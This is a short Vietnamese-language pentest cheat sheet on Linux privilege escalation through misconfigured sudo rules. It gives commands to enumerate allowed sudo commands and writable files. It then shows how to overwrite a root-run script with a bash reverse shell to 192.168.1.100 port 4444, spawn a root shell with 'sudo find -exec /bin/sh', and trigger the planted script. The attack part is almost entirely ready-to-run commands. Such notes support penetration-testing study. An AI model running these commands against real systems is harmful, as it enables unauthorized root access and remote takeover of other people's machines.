# Sudo Permission

## Điểm chính khai thác

* Tận dụng các lệnh sudo được cấu hình không đúng hoặc tập lệnh được phép chạy với quyền root để thực thi mã hoặc mở shell với quyền quản trị.
* Người dùng có thể chạy lệnh sudo hoặc tập lệnh tham chiếu được cấu hình trong /etc/sudoers hoặc /etc/sudoers.d/, cho phép thực thi mã độc hoặc nâng quyền.
* Sử dụng các công cụ như sudo -l để liệt kê các lệnh sudo được phép, hoặc các công cụ như GTFOBins để tìm cách khai thác các lệnh cụ thể.

## Các bước khai thác

### Kiểm tra lỗ hổng

Kiểm tra lệnh sudo user được phép sử dụng:

```
sudo -l
```

Kiểm tra quyền truy cập tập lệnh/thư mục:

```
find / -writable -type f 2>/dev/null
```

### Thực thi khai thác

Ghi đè tập lệnh có thể ghi:

```
echo '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' > <sudo_file>
```

Khai thác lệnh sudo dễ bị tấn công:

```bash
sudo find / -exec /bin/sh \;
```

Kích hoạt tập lệnh đã ghi đè:

```bash
sudo <sudo_file>
```
